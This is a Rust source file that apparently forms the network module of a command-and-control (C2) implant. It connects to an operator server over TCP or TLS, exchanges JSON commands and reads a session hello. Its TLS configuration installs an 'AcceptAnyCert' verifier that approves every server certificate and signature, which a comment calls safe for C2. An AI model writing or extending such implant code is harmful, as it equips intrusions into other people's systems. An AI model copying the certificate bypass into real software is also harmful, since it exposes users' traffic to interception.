//! Network Service - TCP/TLS communication
//!
//! Compiles in two modes:
//! - default (no features): plain TCP
//! - `tls` feature: TCP wrapped with rustls (accepts self-signed certs)

use crate::kernel::Plugin;
use crate::protocol::{ServerCommand, ServerHello};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

#[cfg(feature = "tls")]
use rustls::{ClientConfig, ClientConnection, StreamOwned};
#[cfg(feature = "tls")]
use std::sync::Arc;

// Inner stream type: plain TCP or TLS-wrapped
#[cfg(not(feature = "tls"))]
type InnerStream = TcpStream;

#[cfg(feature = "tls")]
type InnerStream = StreamOwned<ClientConnection, TcpStream>;

pub struct NetworkService {
    stream: Option<InnerStream>,
}

impl NetworkService {
    pub fn new() -> Self {
        Self { stream: None }
    }

    fn is_read_timeout_kind(kind: std::io::ErrorKind) -> bool {
        matches!(kind, std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut)
    }

    // --- connect: TCP ---

    #[cfg(not(feature = "tls"))]
    pub fn connect(&mut self, addr: &str) -> bool {
        match TcpStream::connect(addr) {
            Ok(s) => {
                s.set_read_timeout(Some(Duration::from_secs(30))).ok();
                s.set_write_timeout(Some(Duration::from_secs(30))).ok();
                self.stream = Some(s);
                true
            }
            Err(_) => false,
        }
    }

    // --- connect: TLS ---

    #[cfg(feature = "tls")]
    pub fn connect(&mut self, addr: &str) -> bool {
        let tcp = match TcpStream::connect(addr) {
            Ok(s) => {
                s.set_read_timeout(Some(Duration::from_secs(30))).ok();
                s.set_write_timeout(Some(Duration::from_secs(30))).ok();
                s
            }
            Err(_) => return false,
        };

        let config = build_tls_client_config();
        let server_name = rustls::pki_types::ServerName::try_from("hermes")
            .expect("valid server name");
        let conn = match ClientConnection::new(Arc::new(config), server_name) {
            Ok(c) => c,
            Err(_) => return false,
        };

        let mut stream = StreamOwned::new(conn, tcp);

        // Drive TLS handshake to completion
        while stream.conn.is_handshaking() {
            if stream.conn.complete_io(&mut stream.sock).is_err() {
                return false;
            }
        }

        self.stream = Some(stream);
        true
    }

    // --- timeout helpers ---

    #[cfg(not(feature = "tls"))]
    fn set_stream_read_timeout(stream: &mut InnerStream, timeout: Duration) -> std::io::Result<()> {
        stream.set_read_timeout(Some(timeout))
    }

    #[cfg(feature = "tls")]
    fn set_stream_read_timeout(stream: &mut InnerStream, timeout: Duration) -> std::io::Result<()> {
        stream.sock.set_read_timeout(Some(timeout))
    }

    // --- send (works for both modes via Write trait) ---

    pub fn send(&mut self, msg: &impl serde::Serialize) -> Result<(), ()> {
        let json = serde_json::to_string(msg).map_err(|_| ())?;
        let stream = self.stream.as_mut().ok_or(())?;
        writeln!(stream, "{}", json).map_err(|_| ())?;
        Ok(())
    }

    // --- read_line ---

    pub fn read_line(&mut self, timeout: Duration) -> Result<Option<String>, ()> {
        let stream = self.stream.as_mut().ok_or(())?;
        Self::set_stream_read_timeout(stream, timeout).map_err(|_| ())?;

        let mut buf = Vec::new();
        let mut byte = [0u8; 1];

        loop {
            match stream.read(&mut byte) {
                Ok(0) => return Ok(None),
                Ok(1) => {
                    if byte[0] == b'\n' {
                        while buf.last() == Some(&b'\r') {
                            buf.pop();
                        }
                        return Ok(Some(String::from_utf8_lossy(&buf).to_string()));
                    }
                    buf.push(byte[0]);
                }
                Err(ref e) if Self::is_read_timeout_kind(e.kind()) => {
                    if buf.is_empty() {
                        return Err(());
                    }
                }
                Err(_) => return Ok(None),
                Ok(_) => unreachable!(),
            }
        }
    }

    // --- receive_hello ---

    pub fn receive_hello(&mut self) -> Option<ServerHello> {
        let stream = self.stream.as_mut()?;
        Self::set_stream_read_timeout(stream, Duration::from_millis(250)).ok();

        let mut buf = Vec::new();
        let mut byte = [0u8; 1];

        loop {
            match stream.read(&mut byte) {
                Ok(0) => return None,
                Ok(1) => {
                    if byte[0] == b'\n' {
                        while buf.last() == Some(&b'\r') {
                            buf.pop();
                        }
                        let line = String::from_utf8_lossy(&buf).to_string();
                        let cmd: ServerCommand = serde_json::from_str(&line).ok()?;
                        match cmd {
                            ServerCommand::Hello {
                                session_nonce,
                                auth_mode,
                                ..
                            } => {
                                return Some(ServerHello {
                                    session_nonce,
                                    auth_mode,
                                });
                            }
                            _ => return None,
                        }
                    }
                    buf.push(byte[0]);
                }
                Err(_) => return None,
                Ok(_) => unreachable!(),
            }
        }
    }

    // --- addr helpers ---

    #[cfg(not(feature = "tls"))]
    pub fn local_addr(&self) -> Option<std::net::SocketAddr> {
        self.stream.as_ref().and_then(|s| s.local_addr().ok())
    }

    #[cfg(feature = "tls")]
    pub fn local_addr(&self) -> Option<std::net::SocketAddr> {
        self.stream.as_ref().and_then(|s| s.sock.local_addr().ok())
    }

    #[cfg(not(feature = "tls"))]
    pub fn peer_addr(&self) -> Option<std::net::SocketAddr> {
        self.stream.as_ref().and_then(|s| s.peer_addr().ok())
    }

    #[cfg(feature = "tls")]
    pub fn peer_addr(&self) -> Option<std::net::SocketAddr> {
        self.stream.as_ref().and_then(|s| s.sock.peer_addr().ok())
    }
}

// --- TLS config: accept any certificate (self-signed) ---

#[cfg(test)]
mod tests {
    use super::NetworkService;

    #[test]
    fn read_timeouts_include_windows_timed_out() {
        assert!(NetworkService::is_read_timeout_kind(std::io::ErrorKind::WouldBlock));
        assert!(NetworkService::is_read_timeout_kind(std::io::ErrorKind::TimedOut));
        assert!(!NetworkService::is_read_timeout_kind(std::io::ErrorKind::UnexpectedEof));
    }
}

#[cfg(feature = "tls")]
fn build_tls_client_config() -> ClientConfig {
    use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
    use rustls::crypto::ring::default_provider;
    use rustls::{DigitallySignedStruct, Error, SignatureScheme};

    /// Verifier that accepts any server certificate.
    /// Safe for C2 where the server uses self-signed certs.
    #[derive(Debug)]
    struct AcceptAnyCert;

    impl ServerCertVerifier for AcceptAnyCert {
        fn verify_server_cert(
            &self,
            _end_entity: &rustls::pki_types::CertificateDer<'_>,
            _intermediates: &[rustls::pki_types::CertificateDer<'_>],
            _server_name: &rustls::pki_types::ServerName<'_>,
            _ocsp_response: &[u8],
            _now: rustls::pki_types::UnixTime,
        ) -> Result<ServerCertVerified, Error> {
            Ok(ServerCertVerified::assertion())
        }

        fn verify_tls12_signature(
            &self,
            _message: &[u8],
            _cert: &rustls::pki_types::CertificateDer<'_>,
            _dss: &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, Error> {
            Ok(HandshakeSignatureValid::assertion())
        }

        fn verify_tls13_signature(
            &self,
            _message: &[u8],
            _cert: &rustls::pki_types::CertificateDer<'_>,
            _dss: &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, Error> {
            Ok(HandshakeSignatureValid::assertion())
        }

        fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
            vec![
                SignatureScheme::RSA_PKCS1_SHA256,
                SignatureScheme::RSA_PKCS1_SHA384,
                SignatureScheme::RSA_PKCS1_SHA512,
                SignatureScheme::ECDSA_NISTP256_SHA256,
                SignatureScheme::ECDSA_NISTP384_SHA384,
                SignatureScheme::RSA_PSS_SHA256,
                SignatureScheme::RSA_PSS_SHA384,
                SignatureScheme::RSA_PSS_SHA512,
                SignatureScheme::ED25519,
                SignatureScheme::ED448,
            ]
        }
    }

    let provider = default_provider();
    let _ = provider.clone().install_default();

    ClientConfig::builder_with_provider(Arc::new(provider))
        .with_safe_default_protocol_versions()
        .unwrap()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(AcceptAnyCert))
        .with_no_client_auth()
}

impl Plugin for NetworkService {
    fn name(&self) -> &'static str {
        "network"
    }
}

impl Default for NetworkService {
    fn default() -> Self {
        Self::new()
    }
}
